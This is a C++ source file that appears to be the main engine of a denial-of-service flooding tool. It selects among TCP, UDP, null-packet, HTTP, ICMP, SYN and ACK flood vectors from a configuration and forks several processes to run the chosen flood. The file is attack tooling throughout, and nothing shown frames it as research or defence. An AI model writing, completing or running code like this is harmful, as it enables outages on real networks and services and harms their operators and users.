#include "engine.h"
#include "tcp_flood.h"
#include "udp_flood.h"
#include "null_tcp.h"
#include "null_udp.h"
#include "http_flood.h"
#include "icmp_flood.h"
#include "syn_flood.h"
#include "ack_flood.h"

#include <memory>
#include <unistd.h>

engine::engine(std::shared_ptr<Config> config) {
    std::unique_ptr<Vector> flood{};
    switch(config->vec){
        case TCP_FLOOD:
            flood.reset(new tcp_flood(config));
            break;
        case UDP_FLOOD:
            flood.reset(new udp_flood(config));
            break;
        case NULL_TCP:
            flood.reset(new null_tcp(config));
            break;
        case NULL_UDP:
            flood.reset(new null_udp(config));
            break;
        case HTTP_FLOOD:
            flood.reset(new http_flood(config));
            break;
        case ICMP_FLOOD:
            flood.reset(new icmp_flood(config));
            break;
        case SYN_FLOOD:
            flood.reset(new syn_flood(config));
            break;
        case ACK_FLOOD:
            flood.reset(new ack_flood(config));
            break;
        default:
            fputs("[-] invalid Vector selected\n", stderr);
            exit(EXIT_FAILURE);
    }

    for(int i = 0; i < config->trds; ++i){
        if(fork())
            flood->run();
    }
}
